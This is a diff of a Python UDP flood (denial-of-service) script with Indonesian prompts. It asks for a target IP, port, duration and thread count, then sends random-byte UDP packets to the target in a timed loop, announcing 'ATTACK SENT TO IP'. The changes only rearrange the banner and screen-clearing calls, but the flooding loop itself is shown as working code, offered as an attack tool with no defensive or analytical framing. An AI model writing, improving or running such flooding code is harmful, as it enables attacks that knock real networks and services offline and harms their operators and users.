@@ -58,13 +58,13 @@ ip = str(input("\033[94m╔═══\033[91m[ Masukkan IP-nya ] •\n\033[94m╠
 port = int(input("\033[94m╠═══\033[91m[ Masukkan PORT-nya ] •\n\033[94m╠══>\033[0m "))
 time = int(input("\033[94m╠═══\033[91m[ Masukkan PACKETs-nya ] •\n\033[94m╠══>\033[0m "))
 size = int(input("\033[94m╠═══\033[91m[ Masukkan THREADs-nya ] •\n\033[94m╠══>\033[0m "))
+clear()
+attacking()
+print("\033[94m[ ク ]  -  ATTACK SENT TO IP \033[91m{}\033[94m AND PORT \033[91m{}".format(ip, port))
 ###################################################################################
 # \033[94m[ ク ]  -  ATTACK SENT TO IP \033[91m{ip}\033[94m AND PORT \033[91m{port}
 
 def attack():
-    attacking()
-    fmt = '\033[94m[ ク ]  -  ATTACK SENT TO IP \033[91m{ip}\033[94m AND PORT \033[91m{port}'.format(ip=ip, port='port {port}'.format(port=port) if port else 'random ports')
-    print(fmt)
     startup = tt()
     size = os.urandom(min(666, size))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -74,6 +74,7 @@ def attack():
         if (startup + time) < endtime:
             break
         sock.sendto(size, (ip, port))
+        
 
 def run1():
 	data = random._urandom(1024)
@@ -152,5 +153,5 @@ if __name__ == '__main__':
     try:
         attack()
     except KeyboardInterrupt:
+    	clear()
         stoped()
-        clear()
